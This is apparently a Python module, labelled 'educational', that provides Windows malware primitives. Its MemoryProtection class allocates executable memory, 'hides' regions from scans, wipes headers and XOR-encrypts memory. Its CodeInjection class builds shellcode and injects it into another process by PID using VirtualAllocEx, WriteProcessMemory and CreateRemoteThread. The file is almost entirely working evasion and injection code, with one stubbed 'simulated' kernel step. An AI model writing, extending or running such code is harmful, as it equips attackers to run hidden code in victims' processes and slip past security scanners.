"""
Memory utilities for advanced protection
Educational purposes only
"""

import ctypes
import struct
import os
from ctypes import wintypes
import win32api
import win32con
import win32process

# Windows constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_GUARD = 0x100
PAGE_NOACCESS = 0x01
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

class MemoryProtection:
    """Advanced memory protection techniques"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.process_handle = self.kernel32.GetCurrentProcess()
        
    def allocate_hidden_memory(self, size: int) -> ctypes.c_void_p:
        """Allocate memory in hidden region"""
        # Allocate memory with special attributes
        base_address = self.kernel32.VirtualAllocEx(
            self.process_handle,
            None,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if base_address:
            # Mark as guarded
            old_protect = wintypes.DWORD()
            self.kernel32.VirtualProtectEx(
                self.process_handle,
                base_address,
                size,
                PAGE_EXECUTE_READWRITE | PAGE_GUARD,
                ctypes.byref(old_protect)
            )
        
        return base_address
    
    def hide_memory_region(self, address: int, size: int):
        """Hide memory region from scans"""
        # Remove from VAD tree (simulated)
        # In real implementation, this would manipulate kernel structures
        
        # Change protection to make it less suspicious
        old_protect = wintypes.DWORD()
        self.kernel32.VirtualProtectEx(
            self.process_handle,
            ctypes.c_void_p(address),
            size,
            PAGE_EXECUTE_READWRITE,
            ctypes.byref(old_protect)
        )
        
        # Zero headers
        header_size = 0x40
        zero_buffer = ctypes.create_string_buffer(header_size)
        bytes_written = ctypes.c_size_t()
        
        self.kernel32.WriteProcessMemory(
            self.process_handle,
            ctypes.c_void_p(address),
            zero_buffer,
            header_size,
            ctypes.byref(bytes_written)
        )
    
    def create_memory_ghost_region(self, size: int):
        """Create ghost memory region"""
        # Allocate large region
        large_size = size * 10
        base = self.kernel32.VirtualAlloc(
            None,
            large_size,
            MEM_RESERVE,
            PAGE_NOACCESS
        )
        
        if base:
            # Commit only small portion
            committed = self.kernel32.VirtualAlloc(
                base,
                size,
                MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
            )
            
            # Make rest inaccessible
            self.kernel32.VirtualProtect(
                ctypes.c_void_p(base + size),
                large_size - size,
                PAGE_NOACCESS,
                ctypes.byref(wintypes.DWORD())
            )
            
            return committed
        
        return None
    
    def encrypt_memory_region(self, address: int, size: int, key: bytes):
        """XOR encrypt memory region"""
        # Read memory
        buffer = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t()
        
        self.kernel32.ReadProcessMemory(
            self.process_handle,
            ctypes.c_void_p(address),
            buffer,
            size,
            ctypes.byref(bytes_read)
        )
        
        # XOR encrypt
        encrypted = bytearray(buffer.raw)
        key_len = len(key)
        for i in range(size):
            encrypted[i] ^= key[i % key_len]
        
        # Write back
        bytes_written = ctypes.c_size_t()
        self.kernel32.WriteProcessMemory(
            self.process_handle,
            ctypes.c_void_p(address),
            bytes(encrypted),
            size,
            ctypes.byref(bytes_written)
        )

class CodeInjection:
    """Code injection utilities"""
    
    @staticmethod
    def create_shellcode(opcodes: list) -> bytes:
        """Create shellcode from opcodes"""
        # Example: Simple NOP sled
        nop_sled = b"\x90" * 16
        
        # Convert opcodes to bytes
        shellcode = nop_sled
        for opcode in opcodes:
            if isinstance(opcode, str):
                shellcode += bytes.fromhex(opcode)
            else:
                shellcode += bytes([opcode])
        
        # Add return
        shellcode += b"\xC3"  # RET
        
        return shellcode
    
    @staticmethod
    def inject_shellcode(target_pid: int, shellcode: bytes) -> bool:
        """Inject shellcode into target process"""
        # Open target process
        process_handle = win32api.OpenProcess(
            win32con.PROCESS_ALL_ACCESS,
            False,
            target_pid
        )
        
        if not process_handle:
            return False
        
        try:
            # Allocate memory in target
            remote_memory = win32process.VirtualAllocEx(
                process_handle,
                None,
                len(shellcode),
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_EXECUTE_READWRITE
            )
            
            # Write shellcode
            bytes_written = ctypes.c_size_t()
            win32process.WriteProcessMemory(
                process_handle,
                remote_memory,
                shellcode,
                len(shellcode),
                ctypes.byref(bytes_written)
            )
            
            # Create remote thread
            thread_handle = win32process.CreateRemoteThread(
                process_handle,
                None,
                0,
                remote_memory,
                None,
                0,
                None
            )
            
            return thread_handle is not None
            
        finally:
            win32api.CloseHandle(process_handle)